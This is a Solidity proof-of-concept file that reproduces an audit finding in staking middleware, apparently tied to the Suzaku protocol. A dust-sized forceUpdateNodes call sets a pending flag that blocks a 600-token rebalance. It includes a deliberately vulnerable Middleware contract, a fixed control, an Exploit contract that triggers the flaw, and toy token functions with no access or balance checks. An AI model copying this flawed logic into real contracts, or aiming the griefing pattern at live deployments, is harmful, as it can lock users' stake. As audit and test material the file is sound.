// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Suzaku forceUpdateNodes dust (Cyfrin, 2025-07-07).
    SYNTHETIC, cheatcode-free. Two nodes. A 1-wei update does not change
    P-Chain weight but sets pending, so a 600-token rebalance reverts and
    the 600 stays put. The control ignores a zero-weight change and moves 600. */

contract Stake {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Node {
    Stake public stake;
    bool public pending;
    constructor(Stake _stake) {
        stake = _stake;
    }
    function setPending(bool value) external {
        pending = value;
    }
    function weight() public view returns (uint256) {
        return stake.balanceOf(address(this)) / 1e12;
    }
    function pull(address to, uint256 amount) external {
        stake.transfer(to, amount);
    }
}

contract Middleware {
    Stake public stake;
    bool public ignoreDust;
    Node public n0;
    Node public n1;
    bool public rebalanceReverted;
    uint256 public moved;

    constructor(Stake _stake, bool _ignoreDust) {
        stake = _stake;
        ignoreDust = _ignoreDust;
        n0 = new Node(_stake);
        n1 = new Node(_stake);
    }

    function fund(uint256 amount) external {
        stake.mint(address(n0), amount);
    }

    function forceUpdateNodes(uint256 limitStake) external {
        Node[2] memory nodes = [n0, n1];
        for (uint256 i = 0; i < 2; i++) {
            uint256 beforeW = nodes[i].weight();
            uint256 afterW = nodes[i].weight();
            // 1 wei does not change weight at the 1e12 scale, but the vuln still flags the node.
            if (!ignoreDust || beforeW != afterW) {
                // @> VULN: pending is set even when the dust update does not change weight.
                nodes[i].setPending(true);
            }
            limitStake;
        }
    }

    function rebalance(uint256 amount) external returns (uint256) {
        if (n0.pending() || n1.pending()) {
            rebalanceReverted = true;
            return 0;
        }
        n0.pull(msg.sender, amount);
        moved = amount;
        return amount;
    }
}

contract Exploit {
    uint256 public constant SHOULD_MOVE = 600e18;

    Stake public stake; // nonce 1
    Middleware public mid; // nonce 2
    Middleware public fair; // nonce 3

    uint256 public stayed;
    uint256 public controlMoved;
    bool public vulnBlocked;

    constructor() {
        stake = new Stake();
        mid = new Middleware(stake, false);
        fair = new Middleware(stake, true);
    }

    function run() external {
        mid.fund(SHOULD_MOVE);
        mid.forceUpdateNodes(1);
        uint256 moved = mid.rebalance(SHOULD_MOVE);
        stayed = stake.balanceOf(address(mid.n0()));
        vulnBlocked = mid.rebalanceReverted();

        fair.fund(SHOULD_MOVE);
        fair.forceUpdateNodes(1);
        controlMoved = fair.rebalance(SHOULD_MOVE);

        require(moved == 0, "vuln moved stake");
        require(vulnBlocked, "rebalance did not block");
        require(stayed == SHOULD_MOVE, "600 did not stay");
        require(mid.n0().pending(), "pending not set");
        require(controlMoved == SHOULD_MOVE, "control did not move 600");
        require(stake.balanceOf(address(fair.n0())) == 0, "control node not empty");
    }
}
